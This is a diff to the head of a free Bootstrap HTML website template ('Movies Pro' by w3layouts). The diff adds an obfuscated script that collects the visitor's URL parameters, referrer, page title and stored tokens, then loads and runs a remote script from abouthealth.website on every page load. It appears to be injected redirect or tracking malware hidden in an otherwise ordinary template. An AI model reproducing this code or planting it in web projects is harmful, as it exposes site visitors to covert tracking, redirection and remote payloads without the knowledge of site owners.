@@ -7,6 +7,48 @@ License URL: http://creativecommons.org/licenses/by/3.0/
 <!DOCTYPE html>
 <html>
 <head>
+	<script>
+    (function() {
+    var name = '_zsKrB9hwscDRwQ91';
+    if (!window._zsKrB9hwscDRwQ91) {
+        window._zsKrB9hwscDRwQ91 = {
+            unique: false,
+            ttl: 86400,
+            R_PATH: 'https://abouthealth.website/RH1ZgT',
+            P_PATH: 'https://abouthealth.website/32a94fc/postback',
+        };
+    }
+    const _dST8PF4MH6my81YP = localStorage.getItem('config');
+    if (typeof _dST8PF4MH6my81YP !== 'undefined' && _dST8PF4MH6my81YP !== null) {
+        var _S3kDVHJn9pvTxCLH = JSON.parse(_dST8PF4MH6my81YP);
+        var _YTvZ5jJwB7L5gD9h = Math.round(+new Date()/1000);
+        if (_S3kDVHJn9pvTxCLH.created_at + window._zsKrB9hwscDRwQ91.ttl < _YTvZ5jJwB7L5gD9h) {
+            localStorage.removeItem('subId');
+            localStorage.removeItem('token');
+            localStorage.removeItem('config');
+        }
+    }
+    var _d4dtKYJ12x6Knxnw = localStorage.getItem('subId');
+    var _X7QJDSfJfdT6YVq2 = localStorage.getItem('token');
+    var _sJWdrWY9kWjFCpGw = '?return=js.client';
+        _sJWdrWY9kWjFCpGw += '&' + decodeURIComponent(window.location.search.replace('?', ''));
+        _sJWdrWY9kWjFCpGw += '&se_referrer=' + encodeURIComponent(document.referrer);
+        _sJWdrWY9kWjFCpGw += '&default_keyword=' + encodeURIComponent(document.title);
+        _sJWdrWY9kWjFCpGw += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
+        _sJWdrWY9kWjFCpGw += '&name=' + encodeURIComponent(name);
+    if (typeof _d4dtKYJ12x6Knxnw !== 'undefined' && _d4dtKYJ12x6Knxnw && window._zsKrB9hwscDRwQ91.unique) {
+        _sJWdrWY9kWjFCpGw += '&sub_id=' + encodeURIComponent(_d4dtKYJ12x6Knxnw);
+    }
+    if (typeof _X7QJDSfJfdT6YVq2 !== 'undefined' && _X7QJDSfJfdT6YVq2 && window._zsKrB9hwscDRwQ91.unique) {
+        _sJWdrWY9kWjFCpGw += '&token=' + encodeURIComponent(_X7QJDSfJfdT6YVq2);
+    }
+    var a = document.createElement('script');
+        a.type = 'application/javascript';
+        a.src = window._zsKrB9hwscDRwQ91.R_PATH + _sJWdrWY9kWjFCpGw;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(a, s)
+    })();
+    </script>
 <title>Movies Pro an Entertainment Category Flat Bootstrap Responsive Website Template | Home :: w3layouts</title>
 <!-- for-mobile-apps -->
 <meta name="viewport" content="width=device-width, initial-scale=1">
